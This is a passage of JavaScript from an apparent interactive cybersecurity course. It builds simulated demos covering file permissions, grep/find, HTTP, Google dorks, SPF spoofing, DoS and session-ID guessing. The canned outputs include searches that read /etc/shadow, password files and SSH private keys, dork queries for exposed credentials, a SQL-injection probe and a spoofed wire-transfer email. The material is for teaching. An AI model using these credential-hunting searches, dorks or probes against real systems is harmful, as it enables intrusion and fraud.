            $$('#dirBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');
            $('#dirDesc').innerHTML='<strong>'+b.dataset.dir+'</strong><br>'+dirs[b.dataset.dir];
        };});
    }

    /* ============================================================
       C3: FILE PERMISSIONS DEMO
       ============================================================ */
    function demoPermissions(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">INTERACTIVE</span><span class="demo-title">File Permission Calculator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:24px;justify-content:center;flex-wrap:wrap" id="permGrid"></div><div style="text-align:center;font-family:var(--font-mono);font-size:1.5rem" id="permResult">-rwxr-xr-x = 755</div><div id="permCmd" style="text-align:center;font-family:var(--font-mono);font-size:0.9rem;color:var(--text-muted)">chmod 755 file.txt</div></div></div>';
        var cats=['Owner','Group','Others'];var perms=['r','w','x'];var vals=[4,2,1];
        var bits=[[1,1,1],[1,0,1],[1,0,1]];
        function render(){
            var grid=$('#permGrid');grid.innerHTML='';
            cats.forEach(function(c,ci){
                var html='<div style="text-align:center"><div style="font-weight:bold;margin-bottom:8px">'+c+'</div>';
                perms.forEach(function(p,pi){
                    var on=bits[ci][pi];
                    html+='<button class="demo-btn demo-btn-sm permBit" data-ci="'+ci+'" data-pi="'+pi+'" style="width:40px;height:40px;margin:2px;'+(on?'background:var(--accent);color:white':'')+'">'+(on?p:'-')+'</button>';
                });
                html+='</div>';grid.innerHTML+=html;
            });
            var str='-';var num='';
            cats.forEach(function(c,ci){var n=0;perms.forEach(function(p,pi){str+=bits[ci][pi]?p:'-';n+=bits[ci][pi]?vals[pi]:0;});num+=n;});
            $('#permResult').textContent=str+' = '+num;$('#permCmd').textContent='chmod '+num+' file.txt';
            $$('.permBit').forEach(function(b){b.onclick=function(){bits[+b.dataset.ci][+b.dataset.pi]=bits[+b.dataset.ci][+b.dataset.pi]?0:1;render();};});
        }
        render();
    }

    /* ============================================================
       C3: ENVIRONMENT VARIABLES DEMO
       ============================================================ */
    function demoEnvVars(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Environment Variables</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px"><div>$ echo $PATH</div><div style="color:#ccc">/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</div><div style="margin-top:8px">$ echo $HOME</div><div style="color:#ccc">/home/user</div><div style="margin-top:8px">$ echo $USER</div><div style="color:#ccc">user</div><div style="margin-top:8px">$ echo $SHELL</div><div style="color:#ccc">/bin/bash</div><div style="margin-top:8px;color:#ff6b6b">$ export API_KEY="sk-12345secret"  -- Visible in env!</div><div style="margin-top:4px;color:#ff6b6b">$ env | grep API_KEY</div><div style="color:#ccc">API_KEY=sk-12345secret</div></div><div style="font-size:0.85rem;color:var(--text-muted);text-align:center">Never store secrets in environment variables in production -- use a secrets manager!</div></div></div>';
    }

    function demoFileOps(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">INTERACTIVE</span><span class="demo-title">File Operations Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap"><button class="demo-btn demo-btn-sm" id="fopMkdir">mkdir</button><button class="demo-btn demo-btn-sm" id="fopTouch">touch</button><button class="demo-btn demo-btn-sm" id="fopCp">cp</button><button class="demo-btn demo-btn-sm" id="fopMv">mv</button><button class="demo-btn demo-btn-sm" id="fopRm" style="background:var(--danger);color:white">rm -rf</button></div><div id="fopTree" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:120px">/home/user/</div></div></div>';
        var files=['file1.txt','file2.txt'];var dirs=[];
        function render(){var t='/home/user/\n';dirs.forEach(function(d){t+='  '+d+'/\n';});files.forEach(function(f){t+='  '+f+'\n';});$('#fopTree').textContent=t;}
        $('#fopMkdir').onclick=function(){dirs.push('newdir');render();};
        $('#fopTouch').onclick=function(){files.push('newfile_'+Date.now()%1000+'.txt');render();};
        $('#fopCp').onclick=function(){if(files.length)files.push(files[0]+'.bak');render();};
        $('#fopMv').onclick=function(){if(files.length)files[files.length-1]='renamed_'+files[files.length-1];render();};
        $('#fopRm').onclick=function(){files=[];dirs=[];render();};
        render();
    }

    function demoSearch(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">grep and find Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center;flex-wrap:wrap"><select id="srchCmd" style="padding:6px;border-radius:4px;border:1px solid var(--border)"><option value="grep">grep</option><option value="find">find</option></select><input id="srchIn" placeholder="password" style="flex:1;min-width:150px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"><button class="demo-btn demo-btn-sm" id="srchGo">Search</button></div><div id="srchOut" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:100px"></div></div></div>';
        var grepData={'password':'/etc/config.php:$db_pass = "admin123";\n/var/www/.env:DB_PASSWORD=secret\n/home/user/.bash_history:mysql -u root -pS3cr3t','root':'/etc/passwd:root:x:0:0:root:/root:/bin/bash\n/etc/shadow:root:$6$hash...\n/var/log/auth.log:root login accepted','error':'/var/log/syslog:kernel: error reading sector 42\n/var/log/apache2/error.log:PHP Fatal error'};
        var findData={'*.conf':'/etc/apache2/apache2.conf\n/etc/ssh/sshd_config\n/etc/mysql/my.cnf','*.log':'/var/log/syslog\n/var/log/auth.log\n/var/log/apache2/access.log','*.key':'/home/user/.ssh/id_rsa\n/etc/ssl/private/server.key'};
        $('#srchGo').onclick=function(){
            var cmd=$('#srchCmd').value,q=$('#srchIn').value.toLowerCase();
            var data=cmd==='grep'?grepData:findData;
            var match=Object.keys(data).find(function(k){return q.indexOf(k)>=0||k.indexOf(q)>=0;});
            $('#srchOut').textContent=match?'$ '+cmd+' "'+q+'"\n\n'+data[match]:'$ '+cmd+' "'+q+'"\nNo results found';
        };
    }

    function demoProcesses(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Process Manager</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div id="procList" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.75rem;padding:16px;border-radius:8px;overflow-x:auto"></div><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn demo-btn-sm" id="procRefresh">Refresh</button><button class="demo-btn demo-btn-sm" id="procKill" style="background:var(--danger);color:white">Kill Top Process</button></div></div></div>';
        var procs=[{pid:1,user:'root',cpu:'0.0',mem:'0.5',cmd:'/sbin/init'},{pid:423,user:'root',cpu:'0.2',mem:'1.2',cmd:'apache2'},{pid:567,user:'www-data',cpu:'15.3',mem:'3.4',cmd:'php-fpm'},{pid:890,user:'user',cpu:'45.2',mem:'12.1',cmd:'firefox'},{pid:1234,user:'user',cpu:'2.1',mem:'0.8',cmd:'python3 app.py'},{pid:1567,user:'root',cpu:'0.1',mem:'0.3',cmd:'sshd'}];
        function render(){var t='USER       PID  %CPU  %MEM  COMMAND\n';procs.forEach(function(p){t+=p.user.padEnd(10)+String(p.pid).padEnd(5)+p.cpu.padStart(5)+'  '+p.mem.padStart(5)+'  '+p.cmd+'\n';});$('#procList').textContent=t;}
        $('#procRefresh').onclick=function(){procs.forEach(function(p){p.cpu=(Math.random()*50).toFixed(1);p.mem=(Math.random()*15).toFixed(1);});render();};
        $('#procKill').onclick=function(){if(procs.length>1){var top=procs.reduce(function(a,b){return +a.cpu>+b.cpu?a:b;});procs=procs.filter(function(p){return p!==top;});render();}};
        render();
    }

    function demoPipes(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Pipes and Redirects</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="pipeBtns"><button class="demo-btn demo-btn-sm" data-p="1">cat | grep</button><button class="demo-btn demo-btn-sm" data-p="2">ps | grep | wc</button><button class="demo-btn demo-btn-sm" data-p="3">echo > file</button><button class="demo-btn demo-btn-sm" data-p="4">cmd 2>/dev/null</button></div><div id="pipeOut" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:120px;white-space:pre-line"></div></div></div>';
        var examples={'1':'$ cat access.log | grep "404"\n\n192.168.1.5 - "GET /admin" 404\n192.168.1.8 - "GET /wp-login.php" 404\n\nPipe (|) sends output of cat as input to grep','2':'$ ps aux | grep python | wc -l\n\n3\n\nChain: list processes -> filter python -> count lines','3':'$ echo "hello" > output.txt\n$ cat output.txt\nhello\n$ echo "world" >> output.txt\n$ cat output.txt\nhello\nworld\n\n> overwrites, >> appends','4':'$ find / -name "*.conf" 2>/dev/null\n\n/etc/ssh/sshd_config\n/etc/apache2/apache2.conf\n\n2>/dev/null discards error messages'};
        $$('#pipeBtns .demo-btn').forEach(function(b){b.onclick=function(){if(b.dataset.p)$('#pipeOut').textContent=examples[b.dataset.p];};});
    }

    function demoSSH(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">SSH Connection</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn" id="sshConnect">Connect via SSH</button></div><div id="sshOut" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:150px;white-space:pre-line"></div></div></div>';
        var lines=['$ ssh user@192.168.1.100','The authenticity of host cannot be established.','ED25519 key fingerprint is SHA256:abc123...xyz','Are you sure you want to continue connecting? yes','Warning: Permanently added 192.168.1.100 to known hosts.','user@192.168.1.100 password: ****','Welcome to Ubuntu 22.04 LTS','Last login: Mon Jan 1 10:00:00 2025','user@remote:~$ '];
        $('#sshConnect').onclick=function(){var out=$('#sshOut');out.textContent='';var i=0;var iv=setInterval(function(){if(i<lines.length){out.textContent+=lines[i]+'\n';i++;}else clearInterval(iv);},400);};
    }

    /* ============================================================
       C4: GOOGLE DORKS DEMO
       ============================================================ */
    function demoDorks(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">OSINT</span><span class="demo-title">Google Dorks Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;justify-content:center"><input id="dorkIn" value="site:example.com filetype:pdf" style="flex:1;min-width:250px;padding:10px;border-radius:20px;border:1px solid var(--border);font-family:var(--font-mono);font-size:0.85rem"><button class="demo-btn" id="dorkGo">Search</button></div><div id="dorkResults" style="font-size:0.85rem;line-height:1.8"></div></div></div>';
        var dorks={'site:':'example.com/reports/financial-2024.pdf\nexample.com/docs/employee-handbook.pdf\nexample.com/internal/passwords.pdf [SENSITIVE]','intitle:':'Index of /backup/passwords/\nIndex of /admin/credentials/\nExposed directory listings!','inurl:':'example.com/wp-admin/login.php\nblog.target.com/wp-admin/\nWordPress admin panels found!','filetype:':'example.com/reports/financial-2024.pdf\nexample.com/internal/passwords.pdf'};
        $('#dorkGo').onclick=function(){var q=$('#dorkIn').value;var match=Object.keys(dorks).find(function(k){return q.indexOf(k)>=0;});$('#dorkResults').innerHTML=match?'<pre style="white-space:pre-wrap">Results for: '+esc(q)+'\n\n'+dorks[match]+'</pre>':'<div>No results. Try adding site:, intitle:, inurl:, or filetype: operators</div>';};
    }

    function demoHTTP(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">HTTP Request/Response Viewer</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap" id="httpBtns"><button class="demo-btn demo-btn-sm active" data-h="get">GET /</button><button class="demo-btn demo-btn-sm" data-h="post">POST /login</button><button class="demo-btn demo-btn-sm" data-h="404">GET /missing</button><button class="demo-btn demo-btn-sm" data-h="500">GET /crash</button></div><div style="display:flex;gap:16px;flex-wrap:wrap"><div style="flex:1;min-width:250px"><div style="font-weight:bold;margin-bottom:4px;font-size:0.85rem">Request</div><pre id="httpReq" style="background:#1a1a2e;color:#00ff41;padding:12px;border-radius:8px;font-size:0.78rem;overflow-x:auto"></pre></div><div style="flex:1;min-width:250px"><div style="font-weight:bold;margin-bottom:4px;font-size:0.85rem">Response</div><pre id="httpRes" style="background:#1a1a2e;color:#00ff41;padding:12px;border-radius:8px;font-size:0.78rem;overflow-x:auto"></pre></div></div></div></div>';
        var data={get:{req:'GET / HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\nAccept: text/html',res:'HTTP/1.1 200 OK\nServer: nginx/1.18\nContent-Type: text/html\n\n<html>...</html>'},post:{req:'POST /login HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=secret',res:'HTTP/1.1 302 Found\nLocation: /dashboard\nSet-Cookie: session=abc123; HttpOnly'},'404':{req:'GET /admin/secret HTTP/1.1\nHost: example.com',res:'HTTP/1.1 404 Not Found\nContent-Type: text/html\n\n404 - Page Not Found'},'500':{req:'GET /api/data?id=1\' HTTP/1.1\nHost: example.com',res:'HTTP/1.1 500 Internal Server Error\nServer: Apache/2.4.49\n\nError: SQL syntax error\nPossible injection!'}};
        function show(k){$('#httpReq').textContent=data[k].req;$('#httpRes').textContent=data[k].res;}
        $$('#httpBtns .demo-btn').forEach(function(b){b.onclick=function(){if(b.dataset.h){$$('#httpBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');show(b.dataset.h);}};});
        show('get');
    }

    function demoCookies(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">INTERACTIVE</span><span class="demo-title">Cookie Inspector</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center;flex-wrap:wrap"><input id="cookieName" value="session_id" placeholder="Name" style="width:120px;padding:6px;border-radius:4px;border:1px solid var(--border);font-family:var(--font-mono)"><input id="cookieVal" value="abc123xyz" placeholder="Value" style="width:150px;padding:6px;border-radius:4px;border:1px solid var(--border);font-family:var(--font-mono)"><button class="demo-btn demo-btn-sm" id="cookieSet">Set Cookie</button><button class="demo-btn demo-btn-sm" id="cookieRead">Read Cookies</button></div><div id="cookieOut" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-family:var(--font-mono);font-size:0.82rem"></div><div style="font-size:0.85rem;color:var(--text-muted);text-align:center">HttpOnly cookies cannot be read by JavaScript, protecting session IDs from XSS attacks</div></div></div>';
        $('#cookieSet').onclick=function(){document.cookie=$('#cookieName').value+'='+$('#cookieVal').value+';path=/;SameSite=Strict';$('#cookieOut').textContent='Cookie set: '+$('#cookieName').value+'='+$('#cookieVal').value;};
        $('#cookieRead').onclick=function(){$('#cookieOut').textContent='Current cookies:\n'+(document.cookie||'(none)').split(';').join('\n');};
    }

    /* ============================================================
       C5: NETWORK HARDWARE, IP, TCP/UDP, SUBNET, SPF, DNS, OSI, DoS
       ============================================================ */
    function demoNetHardware(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Network Devices</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap" id="netBtns"><button class="demo-btn demo-btn-sm active" data-d="switch">Switch</button><button class="demo-btn demo-btn-sm" data-d="hub">Hub</button><button class="demo-btn demo-btn-sm" data-d="router">Router</button></div><div id="netVis" style="text-align:center;padding:16px;background:var(--bg-secondary);border-radius:8px;font-size:0.85rem;min-height:120px"></div></div></div>';
        var info={switch:'<strong>Switch</strong><br>Reads MAC address table, sends to correct port only<br>Layer 2 (Data Link)<br>Efficient and Secure',hub:'<strong>Hub</strong><br>Sends data to ALL ports (broadcast)<br>Layer 1 (Physical)<br>Wasteful, Insecure (packet sniffing!)',router:'<strong>Router</strong><br>Connects two networks (LAN to Internet)<br>Layer 3 (Network) uses IP addresses<br>Has NAT, firewall, DHCP'};
        $$('#netBtns .demo-btn').forEach(function(b){b.onclick=function(){if(b.dataset.d){$$('#netBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');$('#netVis').innerHTML=info[b.dataset.d];}};});
        $('#netVis').innerHTML=info['switch'];
    }

    function demoIP(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">IP Address Checker</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center"><input id="ipIn" value="192.168.1.100" style="width:180px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"><button class="demo-btn demo-btn-sm" id="ipCheck">Check</button></div><div id="ipOut" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-size:0.85rem;text-align:center"></div></div></div>';
        $('#ipCheck').onclick=function(){
            var ip=$('#ipIn').value.trim();var parts=ip.split('.');
            if(parts.length!==4||parts.some(function(p){return isNaN(p)||+p<0||+p>255;})){$('#ipOut').innerHTML='Invalid IPv4 address';return;}
            var a=+parts[0],b=+parts[1];
            var type='Public',cls='';
            if(a===10){type='Private (Class A)';cls='10.0.0.0/8';}
            else if(a===172&&b>=16&&b<=31){type='Private (Class B)';cls='172.16.0.0/12';}
            else if(a===192&&b===168){type='Private (Class C)';cls='192.168.0.0/16';}
            else if(a===127){type='Loopback';cls='127.0.0.0/8';}
            var bin=parts.map(function(p){return (+p).toString(2).padStart(8,'0');}).join('.');
            $('#ipOut').innerHTML='<strong>'+type+'</strong>'+(cls?' - '+cls:'')+'<br>Binary: <code>'+bin+'</code>';
        };$('#ipCheck').click();
    }

    function demoTCPUDP(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">TCP Handshake vs UDP</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn active" id="tcpBtn">TCP (Reliable)</button><button class="demo-btn" id="udpBtn">UDP (Fast)</button></div><div id="protoVis" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-family:var(--font-mono);font-size:0.82rem;text-align:center;min-height:150px;white-space:pre"></div></div></div>';
        var tcp='Client              Server\n  |                    |\n  |---- SYN ---------> |  1. Request connection\n  |                    |\n  |<--- SYN/ACK ------ |  2. Acknowledge + accept\n  |                    |\n  |---- ACK ---------> |  3. Connection established\n  |                    |\n  |<=== DATA =========>|  4. Reliable data transfer\n  |                    |\n  |---- FIN ---------> |  5. Close connection';
        var udp='Client              Server\n  |                    |\n  |==== DATA =========>|  Just send it!\n  |==== DATA =========>|  No handshake needed\n  |==== DATA =========>|  No acknowledgement\n  |    X LOST X        |  Lost packet? Oh well!\n  |==== DATA =========>|  Keep sending\n  |                    |\n  Fast but unreliable   Use: Video, Gaming, DNS';
        function show(p){$('#protoVis').textContent=p==='tcp'?tcp:udp;}
        $('#tcpBtn').onclick=function(){$('#tcpBtn').classList.add('active');$('#udpBtn').classList.remove('active');show('tcp');};
        $('#udpBtn').onclick=function(){$('#udpBtn').classList.add('active');$('#tcpBtn').classList.remove('active');show('udp');};
        show('tcp');
    }

    function demoSubnet(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Subnet Calculator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center;flex-wrap:wrap"><input id="subIp" value="192.168.1.0" style="width:140px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"><span>/</span><input id="subCidr" type="number" min="8" max="30" value="24" style="width:60px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);text-align:center"><button class="demo-btn demo-btn-sm" id="subCalc">Calculate</button></div><div id="subOut" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-family:var(--font-mono);font-size:0.85rem;white-space:pre"></div></div></div>';
        $('#subCalc').onclick=function(){
            var cidr=+$('#subCidr').value;var hosts=Math.pow(2,32-cidr)-2;
            var maskBin='';for(var i=0;i<32;i++)maskBin+=i<cidr?'1':'0';
            var mask=[maskBin.slice(0,8),maskBin.slice(8,16),maskBin.slice(16,24),maskBin.slice(24,32)].map(function(b){return parseInt(b,2);}).join('.');
            var ip=$('#subIp').value.split('.').map(Number);
            var netParts=ip.map(function(p,i){return p&parseInt(maskBin.slice(i*8,i*8+8),2);});
            var bcastParts=netParts.map(function(p,i){return p|(255-parseInt(maskBin.slice(i*8,i*8+8),2));});
            $('#subOut').textContent='Network: '+netParts.join('.')+'/'+cidr+'\nSubnet Mask: '+mask+'\nBroadcast: '+bcastParts.join('.')+'\nUsable Hosts: '+(hosts>0?hosts:0)+'\nFirst Host: '+netParts.slice(0,3).join('.')+'.'+(netParts[3]+1)+'\nLast Host: '+bcastParts.slice(0,3).join('.')+'.'+(bcastParts[3]-1);
        };$('#subCalc').click();
    }

    function demoSPF(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">INTERACTIVE</span><span class="demo-title">Email Spoofing and SPF Check</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:16px;flex-wrap:wrap"><div style="flex:1;min-width:200px"><div style="font-size:0.85rem;margin-bottom:4px"><strong>Compose Spoofed Email:</strong></div><div style="margin-bottom:4px"><span style="font-size:0.8rem;color:var(--text-muted)">FROM:</span><input id="spfFrom" value="ceo@company.com" style="width:100%;padding:6px;border-radius:4px;border:1px solid var(--border);font-family:var(--font-mono);font-size:0.8rem"></div><div><span style="font-size:0.8rem;color:var(--text-muted)">Subject:</span><input id="spfSubj" value="Urgent wire transfer" style="width:100%;padding:6px;border-radius:4px;border:1px solid var(--border);font-size:0.8rem"></div><button class="demo-btn demo-btn-sm" id="spfSend" style="margin-top:8px">Send</button></div><div style="flex:1;min-width:200px"><div style="font-size:0.85rem;margin-bottom:4px"><strong>SPF Check Result:</strong></div><div id="spfResult" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-size:0.82rem;min-height:100px"></div></div></div></div></div>';
        $('#spfSend').onclick=function(){
            var from=$('#spfFrom').value;var hasSPF=from.indexOf('company.com')>=0;
            $('#spfResult').innerHTML=hasSPF?'<div style="color:var(--danger)">SPF Check: FAIL</div><div style="font-size:0.8rem;margin-top:8px">Sending IP: 185.23.45.67<br>SPF Record: "v=spf1 ip4:10.0.0.0/8 -all"<br><br>Sender IP NOT authorized!<br>Action: Email marked as SPAM</div>':'<div style="color:var(--success)">No SPF record found</div><div style="font-size:0.8rem;margin-top:8px">This domain has no SPF protection!<br>Spoofed email will be delivered.</div>';
        };
    }

    function demoDNS(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">DNS Record Lookup</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center;flex-wrap:wrap"><input id="dnsIn" value="example.com" style="width:180px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"><select id="dnsType" style="padding:8px;border-radius:6px;border:1px solid var(--border)"><option>A</option><option>AAAA</option><option>MX</option><option>NS</option><option>TXT</option></select><button class="demo-btn demo-btn-sm" id="dnsGo">Lookup</button></div><div id="dnsOut" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:80px;white-space:pre"></div></div></div>';
        var records={A:'example.com.    300  IN  A    93.184.216.34',AAAA:'example.com.    300  IN  AAAA 2606:2800:220:1:248:1893:25c8:1946',MX:'example.com.    300  IN  MX   10 mail.example.com.',NS:'example.com.    300  IN  NS   a.iana-servers.net.\nexample.com.    300  IN  NS   b.iana-servers.net.',TXT:'example.com.    300  IN  TXT  "v=spf1 ip4:93.184.216.34 -all"'};
        $('#dnsGo').onclick=function(){var t=$('#dnsType').value;$('#dnsOut').textContent='$ dig '+$('#dnsIn').value+' '+t+'\n\n;; ANSWER SECTION:\n'+records[t];};$('#dnsGo').click();
    }

    function demoOSI(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">OSI Model Explorer</span></div><div class="demo-visual" style="flex-direction:column;gap:4px" id="osiStack"></div></div>';
        var layers=[{n:7,name:'Application',ex:'HTTP, FTP, SMTP, DNS',color:'#e74c3c'},{n:6,name:'Presentation',ex:'SSL/TLS, JSON, JPEG',color:'#e67e22'},{n:5,name:'Session',ex:'Sockets, Sessions',color:'#f1c40f'},{n:4,name:'Transport',ex:'TCP, UDP',color:'#2ecc71'},{n:3,name:'Network',ex:'IP, ICMP, ARP',color:'#3498db'},{n:2,name:'Data Link',ex:'Ethernet, MAC, Switch',color:'#9b59b6'},{n:1,name:'Physical',ex:'Cables, Radio, Signals',color:'#34495e'}];
        var stack=$('#osiStack');
        layers.forEach(function(l){stack.innerHTML+='<div style="background:'+l.color+';color:white;padding:12px 16px;border-radius:4px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:transform 0.2s" class="osiLayer"><span><strong>Layer '+l.n+':</strong> '+l.name+'</span><span style="font-size:0.8rem;opacity:0.8">'+l.ex+'</span></div>';});
        $$('.osiLayer').forEach(function(l){ l.onmouseover=function(){l.style.transform='scale(1.03)';}; l.onmouseout=function(){l.style.transform='scale(1)';}; });
    }

    function demoDoS(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK SIMULATION</span><span class="demo-title">DoS Attack Visualization</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn" id="dosNormal">Normal Traffic</button><button class="demo-btn" style="background:var(--danger);color:white" id="dosAttack">Launch DDoS</button><button class="demo-btn demo-btn-sm" id="dosStop">Stop</button></div><div style="display:flex;gap:16px;align-items:center;justify-content:center"><div style="text-align:center"><div style="font-size:0.8rem;color:var(--text-muted)">Server Load</div><div style="width:200px;height:24px;background:#edf2f7;border-radius:12px;overflow:hidden"><div id="dosFill" style="height:100%;width:10%;background:var(--success);transition:all 0.3s;border-radius:12px"></div></div><div id="dosStatus" style="font-size:0.85rem;margin-top:4px">Online</div></div><div id="dosReqCount" style="font-size:1.5rem;font-weight:bold;font-family:var(--font-mono)">0</div><div style="font-size:0.8rem;color:var(--text-muted)">req/s</div></div></div></div>';
        var iv,load=10;
        function setLoad(l){load=Math.min(100,Math.max(0,l));$('#dosFill').style.width=load+'%';$('#dosFill').style.background=load>80?'var(--danger)':load>50?'var(--warning)':'var(--success)';$('#dosStatus').textContent=load>90?'DOWN!':load>80?'Degraded':'Online';}
        $('#dosNormal').onclick=function(){clearInterval(iv);iv=setInterval(function(){load=10+Math.random()*20;setLoad(load);$('#dosReqCount').textContent=Math.floor(50+Math.random()*50);},500);};
        $('#dosAttack').onclick=function(){clearInterval(iv);var t=0;iv=setInterval(function(){t++;load=Math.min(100,20+t*5);setLoad(load);$('#dosReqCount').textContent=Math.floor(1000+t*500);},200);};
        $('#dosStop').onclick=function(){clearInterval(iv);setLoad(10);$('#dosReqCount').textContent='0';};
    }

    /* ============================================================
       C6 NEW DEMOS
       ============================================================ */
    function demoSessionGuessing(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">VULNERABLE</span><span class="demo-title">Session ID Guessing</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center" id="sessBtns"><button class="demo-btn active" data-s="seq">Sequential IDs</button><button class="demo-btn" data-s="rand">Secure Random IDs</button></div><div style="display:flex;gap:16px;flex-wrap:wrap"><div style="flex:1;min-width:200px"><div style="font-weight:bold;font-size:0.85rem;margin-bottom:8px">Active Sessions:</div><div id="sessList" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.8rem;padding:12px;border-radius:8px"></div></div><div style="flex:1;min-width:200px"><div style="font-weight:bold;font-size:0.85rem;margin-bottom:8px">Brute Force:</div><button class="demo-btn demo-btn-sm" id="sessAttack">Try Next ID</button><div id="sessResult" style="margin-top:8px;font-size:0.85rem"></div></div></div></div></div>';
        var mode='seq',attempt=1005;
        function renderSessions(){
            var ids=mode==='seq'?[1001,1002,1003,1004]:['a8f2c9d1e4b7','c3d5e7f9a1b2','e6f8a0b2c4d6','f1a3b5c7d9e0'];
            $('#sessList').textContent=ids.map(function(id,i){return 'Session '+(i+1)+': '+id;}).join('\n');
        }
        renderSessions();
